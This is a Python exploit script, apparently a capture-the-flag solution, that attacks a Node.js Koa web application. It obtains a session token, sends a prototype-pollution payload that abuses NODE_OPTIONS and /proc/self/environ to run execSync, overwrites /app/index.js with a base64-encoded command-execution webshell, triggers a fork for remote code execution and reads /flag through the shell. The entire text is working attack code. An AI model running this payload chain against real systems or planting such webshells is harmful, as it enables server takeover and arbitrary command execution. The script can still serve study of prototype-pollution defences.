import requests
import re
import base64
from time import sleep

url = "http://ip:port/"

# 获取token
# 随便发送点图片获取token
files = [
    ('images', ('anno.png', open('./1.png', 'rb'), 'image/png')),
    ('images', ('soyo.png', open('./2.png', 'rb'), 'image/png'))
]
res = requests.post(url + "/upload", files=files)
token = res.headers.get('Set-Cookie')
match = re.search(r'token=([a-f0-9\-\.]+)', token)
if match:
    token = match.group(1)
    print(f"[+] token: {token}")
headers = {
    'Cookie': f'token={token}'
}

# 通过原型链污染env
# 反弹shell恶意代码注入

# 写入WebShell
webshell = """
const Koa = require('koa')
const Router = require('koa-router')
const app = new Koa()
const router = new Router()

router.get("/webshell", async (ctx) => {
    const {cmd} = ctx.query
    res = require('child_process').execSync(cmd).toString()
    return ctx.body = {
        res
    }
})

app.use(router.routes())
app.listen(3000, () => {
    console.log('http://127.0.0.1:3000')
})
"""

# 将webshell内容base64编码
encoded_webshell = base64.b64encode(webshell.encode()).decode()

# base64解码后写入文件
payload = {
    "constructor": {
        "prototype": {
            "NODE_OPTIONS": "--require /proc/self/environ",
            "env": {
                "A": f"require(\"child_process\").execSync(\"echo {encoded_webshell} | base64 -d > /app/index.js\")//"
            }
        }
    }
}

# 原型链污染
requests.post(url + "/config", json=payload, headers=headers)

# 触发fork实现RCE
try:
    requests.post(url + "/process", headers=headers)
except Exception as e:
    pass

sleep(2)
# 访问有回显的webshell
res = requests.get(url + "/webshell?cmd=cat /flag")
print(res.text)

